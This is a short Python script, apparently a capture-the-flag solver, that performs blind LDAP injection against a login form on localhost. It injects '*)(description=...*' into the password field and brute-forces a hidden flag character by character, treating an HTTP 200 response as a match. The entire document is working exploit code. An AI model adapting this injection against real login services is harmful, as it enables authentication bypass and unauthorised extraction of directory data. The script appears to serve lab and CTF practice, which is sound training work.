import requests

flag = ""
letters = "0987654321qwertyuiopasdfghjklzxcvbnm{}_"


def get_flag():
    global flag
    url = "http://localhost:8080/"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Referer": url,
    }

    while True:
        found_char = False
        for ch in letters:
            curr_flag = flag + ch
            payload = f"username=testuser&password=*)(description={curr_flag}*"
            response = requests.post(url, data=payload, headers=headers)

            if response.status_code == 200:
                flag += ch
                found_char = True
                print(f"[+] Found: {flag}")
                break

        if not found_char:
            print("[*] No matching character found, exiting.")
            break


if __name__ == "__main__":
    get_flag()
